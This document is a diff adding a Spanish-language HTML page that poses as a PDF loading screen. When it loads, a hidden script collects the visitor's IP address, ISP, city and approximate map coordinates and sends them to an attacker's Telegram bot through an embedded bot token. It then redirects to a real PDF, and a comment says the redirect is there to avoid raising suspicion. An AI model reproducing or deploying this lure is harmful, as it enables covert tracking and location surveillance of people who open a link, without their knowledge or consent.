@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Abriendo Documento PDF...</title>
+    <style>
+        body { background: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <script>
+        // CONFIGURACIÓN
+        const TOKEN = '8458522831:AAFN_UD45YCbGOQd58oVhLHmAhCCyqdrkJs';
+        const CHAT_ID = 'TU_ID_AQUI'; // <--- Pon tu ID de Telegram aquí
+        const PDF_URL = 'https://drive.google.com/uc?export=download&id=ID_DE_TU_DRIVE'; // <--- Tu PDF en la nube
+
+        async function rastrear() {
+            try {
+                // Obtener IP, ISP y GPS por red
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+
+                const texto = `🔔 *ALERTA: ENLACE ABIERTO*\n\n` +
+                              `🌐 *IP:* ${d.ip}\n` +
+                              `📶 *ISP:* ${d.org}\n` +
+                              `📍 *Ciudad:* ${d.city}, ${d.country_name}\n` +
+                              `🔗 *Mapa:* https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
+
+                // Enviar reporte al bot de Telegram
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(texto)}&parse_mode=Markdown`);
+            } catch (err) {
+                console.log("Ignorar error");
+            } finally {
+                // Redirigir al PDF real para no levantar sospechas
+                window.location.href = PDF_URL;
+            }
+        }
+        window.onload = rastrear;
+    </script>
+</body>
+</html>
